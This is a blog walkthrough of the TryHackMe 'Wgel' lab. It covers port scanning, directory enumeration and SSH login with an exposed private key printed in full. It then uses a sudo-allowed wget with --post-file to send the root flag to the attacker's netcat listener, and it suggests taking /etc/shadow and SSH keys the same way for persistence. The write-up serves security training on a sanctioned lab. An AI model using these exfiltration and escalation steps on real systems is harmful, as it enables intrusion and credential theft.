---
title: "Simple Boot to Root: Wgel CTF Walkthrough"
slug: wgel-ctf
layout: post
excerpt_separator:  <!--more-->
categories:
  - ctfs
---

This is a straightforward boot-to-root walkthrough of the [Wgel](https://tryhackme.com/room/wgelctf) CTF found on [TryHackMe](https://tryhackme.com). The objective of this room is to perform active reconnaissance on a web server, obtain credentials, and log in using an exposed SSH key. The final step involves elevating to root by employing a privilege escalation technique with the `wget` binary.

### Step 1: What's Out There?

```plaintext
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpgV7/18RfM9BJUBOcZI/eIARrxAgEeD062pw9L24Ulo5LbBeuFIv7hfRWE/kWUWdqHf082nfWKImTAHVMCeJudQbKtL1SBJYwdNo6QCQyHkHXslVb9CV1Ck3wgcje8zLbrml7OYpwBlumLVo2StfonQUKjfsKHhR+idd3/P5V3abActQLU8zB0a4m3TbsrZ9Hhs/QIjgsEdPsQEjCzvPHhTQCEywIpd/GGDXqfNPB0Yl/dQghTALyvf71EtmaX/fsPYTiCGDQAOYy3RvOitHQCf4XVvqEsgzLnUbqISGugF8ajO5iiY2GiZUUWVn4MVV1jVhfQ0kC3ybNrQvaVcXd
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDCxodQaK+2npyk3RZ1Z6S88i6lZp2kVWS6/f955mcgkYRrV1IMAVQ+jRd5sOKvoK8rflUPajKc9vY5Yhk2mPj8=
|   256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJhXt+ZEjzJRbb2rVnXOzdp5kDKb11LfddnkcyURkYke
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=7/9%OT=22%CT=1%CU=30945%PV=Y%DS=4%DC=T%G=Y%TM=64AB91B3
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=109%TI=Z%II=I%TS=A)SEQ(SP=10
OS:4%GCD=1%ISR=109%TI=Z%CI=RD%TS=A)SEQ(SP=107%GCD=1%ISR=109%TI=Z%TS=A)SEQ(S
OS:P=107%GCD=1%ISR=109%TI=Z%CI=I%TS=A)SEQ(SP=107%GCD=1%ISR=109%TI=Z%CI=RD%T
OS:S=A)OPS(O1=M509ST11NW7%O2=M509ST11NW7%O3=M509NNT11NW7%O4=M509ST11NW7%O5=
OS:M509ST11NW7%O6=M509ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=6
OS:8DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M509NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A
OS:=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O
OS:=%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=O%A=Z%F=R%O=%RD=0%Q=)T5(R=N)T5(R=Y%DF=Y
OS:%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%
OS:RD=0%Q=)T6(R=N)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T6(R=Y%DF=Y%T
OS:=40%W=0%S=O%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0
OS:%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=1
OS:64%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 47.132 days (since Tue May 23 19:55:59 2023)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We are examining two ports: `22` and `80`. Given that we can't do much with SSH unless we attempt to brute force it, and without a username, we would be relentlessly attacking this service, wasting time and probably making no progress. Therefore, the best approach is to enumerate the webserver to find a way in.

Default Apache2 Landing Page:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692102430397/7966773b-6539-41dc-aeaa-533458969c49.png){: .center-image }

The source code reveals a potential username: `Jessie`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692102478196/1cbd7a70-e967-45e2-8919-08317e1dc565.png){: .center-image }

### Step 2: Enumerate Using Gobuster

```bash
gobuster dir --url http://10.10.56.178/sitemap -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 100 -q
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692102543441/959ab724-51fd-49f6-a135-4ba7216efe22.png){: .center-image }

Let's navigate to [`http://10.10.56.178/sitemap/.ssh/`](http://10.10.56.178/sitemap/.ssh/)

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692102577951/43dd3297-168f-4074-a32b-b99ddfd7788a.png){: .center-image }

```plaintext
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
+J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG
/1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE
AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa
M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG
SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv
2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2
p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj
7pUO8zziTXgeDENrcz1uo0e34Fb98z1UFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I
dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy
GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh
shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97
uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N
LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u
QJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW
V35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5
hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr
9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu
eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb
QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
-----END RSA PRIVATE KEY-----
```

Excellent! An unsecured SSH key without a passphrase. We can easily generate our `id_rsa` key, set the permissions, and log in to the web server using this.

### Step 3: Log in

Copy and paste the key into a text file and name it `id_rsa`. Adjust the permissions:

```bash
sudo chmod 600 id_rsa
```

Log in:

```bash
ssh -i id_rsa jessie@10.10.56.178
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692102825560/6035435a-f341-4528-8f98-1d7ab5ffa6b9.png){: .center-image }

Our first flag can be found at this location:

```bash
/home/jessie/Documents
```

### Step 4: Privesc and Root

Now that we have a foothold on the server, let's explore what we can use to elevate our privileges. First, I like to check what the user is allowed to run as `sudo`. We can do this by typing:

```bash
sudo -l
```

Looks like we can use the binary:

```bash
/usr/bin/wget
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692102993678/fac3ffc0-02ac-4f07-aedc-b4cca60b1507.png){: .center-image }

Upon seeing something like this, your mind should instantly consider privilege escalation. [GTFObins](https://gtfobins.github.io/) is a valuable resource for finding elevation techniques.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692103102039/6243510d-5697-42ff-90bd-6fdb2c9af820.png){: .center-image }

We can transmit content to our attack box with `sudo` privileges, effectively granting us access to view materials that would otherwise be restricted. We can easily use `wget` to display the root flag.

Start a netcat listener:

```bash
nc -lvnp 80
```

From the web server:

```bash
sudo /usr/bin/wget http://10.13.28.215:80 --post-file=/root/root_flag.txt
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692103281913/d6604069-0fd0-46bd-9cd4-140bbcc6eb0c.png){: .center-image }

Boom, we've obtained the root flag. From here, we can use this binary to acquire other `SSH` keys, the `/etc/shadow` file, and more to help us maintain persistence.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692103417697/0d0e1534-594d-4cfb-b42a-fff74ab2495a.jpeg){: .center-image }